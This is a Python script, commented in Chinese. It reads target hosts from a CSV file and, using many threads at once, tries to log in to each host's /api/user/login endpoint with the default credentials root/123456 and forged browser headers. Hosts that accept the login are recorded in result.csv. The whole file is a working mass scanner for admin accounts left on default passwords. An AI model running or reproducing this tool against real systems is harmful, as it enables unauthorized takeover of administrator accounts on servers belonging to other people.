import csv
import requests
from threading import Thread, Lock
import json

# 读取host列表
hosts = []
with open('hosts.csv', 'r') as file:
    reader = csv.reader(file)
    for row in reader:
        if row and len(row) > 0: 
            host = row[0].strip()  
            if not host.startswith("http"):
                host = "http://" + host
            hosts.append(host)

# 设置结果文件锁
lock = Lock()

# 定义登录测试函数
def test_login(host):
    login_url = f"{host}/api/user/login?turnstile="  # 根据HTTP请求构建URL
    payload = json.dumps({"username":"root","password":"123456"})  # 使用JSON格式的请求体
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6",
        "content-type": "application/json",  # 设置Content-Type为application/json
        "New-Api-User": "-1",
        "Sec-Ch-Ua-Platform": "Windows",
        "Sec-Ch-Ua": "Microsoft Edge;v=\"129\", \"Not=A?Brand\";v=\"8\", \"Chromium\";v=\"129\"",
        "Sec-Ch-Ua-Mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0",
        "Dnt": "1",
        "Origin": f"{host}",  # 使用当前host作为Origin
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Sec-Gpc": "1",
        "Priority": "u=1, i",
        "Referer": f"{host}/login"  # 使用 /login 作为Referer
    }

    try:
        with requests.Session() as session:
            # 将头部信息编码为 utf-8
            for header, value in headers.items():
                if isinstance(value, str):
                    headers[header] = value.encode('utf-8')

            # 发起POST请求
            response = session.post(login_url, headers=headers, data=payload, allow_redirects=False, timeout=10)

            print(f"Testing {host} - Status code: {response.status_code}")
            # 输出响应头用于调试
            print(f"Response headers for {host}: {response.headers}")
            # 输出响应内容用于调试
            print(f"Response content for {host}: {response.text}")

            # 检查响应内容中的"success": true 或者其他登录成功的标志
            if response.status_code == 200:
                try: 
                    response_json = response.json()
                    # 根据实际情况修改判断登录成功的条件
                    if "success" in response_json and response_json["success"] == True:  
                        with lock:
                            with open('result.csv', 'a', newline='') as file:
                                writer = csv.writer(file)
                                writer.writerow([host])
                        print(f"Login successful for {host}")
                    else:
                        print(f"Login failed for {host} - Success flag not set in response")
                except json.JSONDecodeError:
                    print(f"Login failed for {host} - Invalid JSON response")
            else:
                print(f"Login failed for {host} - Status code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print(f"Error testing {host}: {e}")

# 使用多线程进行并发请求
threads = []
for host in hosts:
    thread = Thread(target=test_login, args=(host,))
    threads.append(thread)
    thread.start()

# 等待所有线程完成
for thread in threads:
    thread.join() 
